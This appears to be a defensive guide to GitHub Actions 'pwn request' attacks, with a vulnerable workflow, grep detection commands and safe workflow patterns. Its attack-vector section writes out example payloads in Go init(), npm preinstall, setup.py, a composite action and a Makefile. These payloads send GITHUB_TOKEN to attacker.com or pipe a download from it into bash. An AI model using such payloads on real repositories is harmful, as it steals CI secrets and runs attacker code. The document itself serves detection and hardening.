# Pwn Request Attacks

## Overview

A "pwn request" occurs when a `pull_request_target` workflow checks out and executes code from a fork PR. The `pull_request_target` trigger runs with the **target repository's permissions and secrets**, but if it checks out the fork's code, the attacker's code runs with those elevated privileges.

---

## The Vulnerability

```yaml
# VULNERABLE: checks out fork code with target repo permissions
on: pull_request_target

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Fork code!
      - run: npm install && npm test  # Executes attacker's code
```

The key elements:
1. `pull_request_target` grants target repo permissions/secrets
2. `actions/checkout` with `ref:` pointing to the PR head checks out **fork code**
3. Any `run:` step after checkout executes attacker-controlled code

---

## Attack Vectors

### Go init() Injection

Go's `init()` functions execute automatically before `main()`. If a workflow runs `go run` on checked-out fork code:

```go
// Attacker adds this to any .go file in the repo
package main

import "os/exec"

func init() {
    _ = exec.Command("bash", "-c",
        `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
        -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" \
        https://attacker.com/collect`).Run()
}
```

This pattern matters because the `init()` payload runs before the expected
quality-check entrypoint, so reviewers may miss the execution path when they
only inspect the invoked command.

### npm preinstall / postinstall

```json
{
  "scripts": {
    "preinstall": "curl -sSfL https://attacker.com/steal | bash"
  }
}
```

Any `npm install`, `npm ci`, or `npm test` (which often installs first) will execute these scripts.

### Python setup.py

```python
from setuptools import setup
from setuptools.command.install import install
import os

class Exploit(install):
    def run(self):
        os.system(f"curl -d token=$GITHUB_TOKEN https://attacker.com/collect")
        install.run(self)

setup(cmdclass={"install": Exploit})
```

### Local Action Override

If the workflow uses a local action (`./.github/actions/setup/action.yml`), the attacker can modify it in their fork:

```yaml
# Attacker's version of .github/actions/setup/action.yml
name: Setup
runs:
  using: composite
  steps:
    - run: curl -sSfL https://attacker.com/steal | bash
      shell: bash
    - run: echo "Setup complete"
      shell: bash
```

This pattern matters because the workflow still appears to call the same local
action path, while the fork has replaced the action body that runs under target
repository privileges.

### Makefile / Shell Script Override

If the workflow runs `make` or a shell script from the checkout:

```makefile
# Attacker's Makefile
.PHONY: all
all:
	@curl -sSfL https://attacker.com/steal | bash
	@$(MAKE) real-build
```

---

## Detection Patterns

```bash
# Find pull_request_target workflows
grep -rn "pull_request_target" .github/workflows/

# Check if they checkout fork code
grep -A 20 "pull_request_target" .github/workflows/*.yml | grep -E "ref:.*pull_request\.(head\.sha|head\.ref)"

# Check for local action usage (could be overridden by fork)
grep -rn "uses: \.\/" .github/workflows/

# Check what runs after checkout
grep -A 50 "actions/checkout" .github/workflows/*.yml | grep -E "^[[:space:]]*- run:"
```

---

## Safe Pattern: Workflow Split

The fix is to split into two workflows: one that builds (with fork code, no secrets) and one that deploys (with secrets, no fork code).

```yaml
# Workflow 1: Build (runs on fork code, no secrets)
name: Build
on: pull_request  # NOT pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4  # Fork code, but read-only token
      - run: npm install && npm test
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
```

```yaml
# Workflow 2: Deploy (runs on trusted code, has secrets)
name: Deploy
on:
  workflow_run:
    workflows: [Build]
    types: [completed]
jobs:
  deploy:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4  # Target repo code only
      - uses: actions/download-artifact@v4
        with:
          run-id: ${{ github.event.workflow_run.id }}
      # Deploy using trusted code + secrets
```

### Safe Pattern: pull_request_target Without Checkout

```yaml
# SAFE: pull_request_target that only reads PR metadata
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/labeler@v5  # Only reads PR metadata
      # No checkout of fork code — attacker can't execute anything
```

---

## Exploitation Scenario Template

```
ATTACK: Pwn Request via [Vector]
ENTRY: Attacker forks the repo and opens a PR
PAYLOAD: Modified [file] containing [malicious code]
TRIGGER: pull_request_target workflow at [workflow file:line]
EXECUTION: Workflow checks out fork code (line X), then runs [command] (line Y)
  which executes the attacker's modified [file]
IMPACT: GITHUB_TOKEN with [permissions] exfiltrated; attacker can [actions]
```
